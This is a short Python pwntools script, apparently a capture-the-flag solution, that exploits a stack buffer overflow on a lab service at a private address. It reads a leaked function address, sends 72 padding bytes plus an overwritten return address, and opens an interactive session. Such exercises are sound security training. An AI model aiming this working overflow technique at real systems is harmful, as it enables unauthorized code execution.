# Exploit written to do a buffer overflow
from pwn import *

# Connect to the adderss and scan until after WOW: was scanned
session = remote("10.67.0.1", 32532)
session.recvuntil("WOW:")

# the address variable will hold everything between WOW: and inculding the new line character which we remove with [:-1]
address = session.recvuntil("\n")[:-1]

# I just like to put print statements to make sure everything was inputted correctly
print(address)

# Either payload works, the first just converts the address into int to later package into 64 byte address
# The second line is writing the address manually, remember we have to write the address backwards
# payload = "Z" * 72 + p64(int(address, 16))
payload = "Z" * 72 + "\xf6\x05\x40" + "\x00" * 5

# Sends the payload
session.sendline(payload)
session.interactive()
